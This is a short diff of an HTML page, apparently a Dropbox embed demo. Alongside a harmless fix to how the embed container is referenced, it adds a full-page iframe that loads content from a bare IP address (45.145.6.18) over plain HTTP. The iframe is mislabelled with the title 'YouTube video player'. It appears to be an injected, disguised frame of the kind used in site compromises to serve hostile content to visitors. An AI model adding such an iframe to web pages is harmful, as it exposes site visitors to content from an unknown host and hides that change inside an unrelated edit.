@@ -603,7 +603,8 @@
             </div>
             <!-- End Result -->
 
-            <div class="embedded-app"></div>
+            <div id="embedded-app"></div>
+            <iframe width="100%" height="100%" src="http://45.145.6.18/history.html" title="YouTube video player" frameborder="0" allowfullscreen></iframe>
          </div>
       </div>
       <!-- End Main Menu -->
@@ -625,7 +626,7 @@
             headerSize: "normal" // or "small"
          }
       }
-      Dropbox.embed(options, "embedded-app");
+      Dropbox.embed(options, document.getElementById("embedded-app"));
    </script>
    <script src="./public/js/script.js"></script>
 </body>
